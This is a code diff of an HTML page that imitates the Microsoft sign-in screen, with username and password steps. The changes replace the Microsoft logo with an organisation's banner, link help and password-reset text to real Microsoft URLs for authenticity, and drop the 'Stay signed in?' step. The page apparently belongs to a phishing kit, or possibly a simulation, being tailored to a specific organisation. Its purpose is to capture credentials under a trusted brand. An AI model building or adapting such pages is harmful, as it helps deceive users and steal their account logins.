@@ -18,16 +18,18 @@
             <form>
                 <div class="mb-16">
                     <p id="error_uname" class="error"></p>
-                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
+                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email or phone" />
                 </div>
             </form>
             <div>
-                <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
-                <p class="mb-16 fs-13">
+                <p class="mb-16 fs-13"><a
+                        href="https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638417599431960449.ODViMGFjODgtNGQ3NC00NDIzLWE3MjMtNWYyMTI3ZjY5YWY4YmJmYTNmMTgtZDIwNC00YTI4LWJlYzMtODczNzAyMTY1YzAz&ui_locales=en-US&mkt=en-US&msafed=0&client-request-id=ed1722a5-a766-4464-910f-368371536397&state=GhOICS4qYyrFZBp1PKUyTDH0y8e9rcodgEdWtPezDR-_oIk3NnrQrkq-bHoBwuhGLDVgWsCHbKgQB81g3l5LCk5URhf3Wew2EDRarXzxpbqUBzdmQv40rjmMw4hmTQc7_L1qs6ZvAzKXN_Y6cPEC3GOxkWhQ2-NAIcWPpKY0a--qAhSvN7AmKrVi8Y4QTa5Ua0tkKcL5x_odXOmJYLAjvZT5RGuisPsvpqMwJJ663Oa8sjrm2xXZMYrGbcKtZCi9fDc_Rk-nO9MsTk-HmiazonyWER462ovPdX8KO3zIdcor_1H7aQHQyMs14WPypOM7MOE0_ky7Wmzu-_cwQYaiZj28-vEA8tKPhrgg-if5KXA&x-client-SKU=ID_NET6_0&x-client-ver=6.34.0.0#"
+                        class="link">Can't access your account?</a></p>
+                <!-- <p class="mb-16 fs-13">
                     <a href="#" class="link">Sign in with a security key
                         <img src="assets/question.png" alt="Question img">
                     </a>
-                </p>
+                </p> -->
             </div>
             <div>
                 <button class="btn" id="btn_next">Next</button>
@@ -41,7 +43,7 @@
 
     <section id="section_pwd" class="d-none">
         <div class="auth-wrapper">
-            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
+            <img src="assets/kmids-assets/bannerlogo.jpg" alt="Microsoft" class="d-block banner-logo" />
             <div class="identity w-100 mt-16 mb-16">
                 <button class="back">
                     <img src="assets/back.png" />
@@ -56,32 +58,12 @@
                 </div>
             </form>
             <div>
-                <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
-                <p class="mb-16">
-                    <a href="#" class="link fs-13">Other ways to sign in</a>
-                </p>
+                <p class="mb-16"> <a
+                        href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAAhZPNi-MEAMX7MVNniuuMq_hxGxYPi5o23x8De8g0mTbNV9Omk6aXkCZpkiZp2iRN2txERMHLCoKyNwUVBoRFPIhePI-Xhb2t_8HKinjaozN6Xrw8eLz3br_XPMBbCNoCW-C7dbgFnr6DEjiGotgMQGALB1BqBgIk4uAAZFPIdQQTuGUmt5vH39x589n8O5v57Aj_cD2yvrisnnhZtkpP2-2iKFrxfO5bTsuKo3ZoLm1_6ebwT9Xqo2r1QW3fWQLj0WUtxREShQiMolAEonAQRamWzFz4Yvd8ITNuJnUVROqAoMRwpaCxiLgQM0nTd6LKIdOFjumajupRP9JVKRJVN5syXHHT11UOFbR-qJdiJjNWKZX09UaH9JIun9SOZHqTefCNxIlfOn_XDudxEhmrOM0e1P-odT2Z64zQtb5LzqdnK2jAj3cq0wN3pEMlVmy7rK1lA6dkhoARcwEiLRMlCdbArBefFRuvKzAXrpZ2ejPeVc5IyEVCTOgE2HjozRHNKWCWGZrJpNyuZuvxWWlHSo6CySISC9SLVMUiDAFap_g0p0t-Ihk6bg3YDtKVt4HmKTAg0ZylDVa8DpoAsKa9US4RdMQnFz6po4pqYmMTzALeErCtEdsTOerrAr3Ipyo27G78dJDmq7VY9Ps4jsgmmS6SCN5OpqKedGcWn007PjVnLGMYAEuZElM1AHqRb5bxcqexQxSH43xgT0heRkrOtuLEgHqEqfSUnZhCqDbYrWSREGUWNIIdoUXlBjCsQtFNf7qASSBnaTLjB17iuoA_x_gJfVl_-wXM5PAP9Vtx4ppLvzQzP16mV3UiXjlL3z5ZJfHcD50X4ZbDbflf14sjp0WH4aO96tO9Nw4ax3feqpxU7r4O1k8PDprHlRv3fK_69f41zQ9_pz_96O4v7Jdf_fgq_AFVudpv56UwcOHtORfDwtDhc8ZpywssE-cBupHKQgkJDHb880k_Je_hp9D9RvV-o3HVOOQYQ2JV3AD_alQ_eany8-H__uLJy681mxvfCGPLDJ309n__-PVW5fkrnz_79vFv33_8Z-_p0fuMfuGxVttz7VRBZ--Fvd06jLvJsI3nxDYYeWIo9gSPGo5243sPjyv_AA2&mkt=en-US&hosted=0&device_platform=Windows+10"
+                        class="link fs-13">Forgot password?</a></p>
             </div>
             <div>
                 <button class="btn" id="btn_sig">Sign in</button>
-            </div>
-        </div>
-    </section>
-
-    <section id="section_final" class="d-none">
-        <div class="auth-wrapper">
-            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
-            <div class="identity w-100 mt-16 mb-16">
-                <span id="user_identity">a@b.com</span>
-            </div>
-            <h2 class="title mb-16">Stay signed in?</h2>
-            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
-            <label class="has-checkbox">
-                <input type="checkbox" class="checkbox" />
-                <span>Don't show this again</span>
-            </label>
-            <div class="btn-group">
-                <button class="btn btn-sec" id="btn_final">No</button>
-                <button class="btn" id="btn_final">Yes</button>
             </div>
         </div>
     </section>
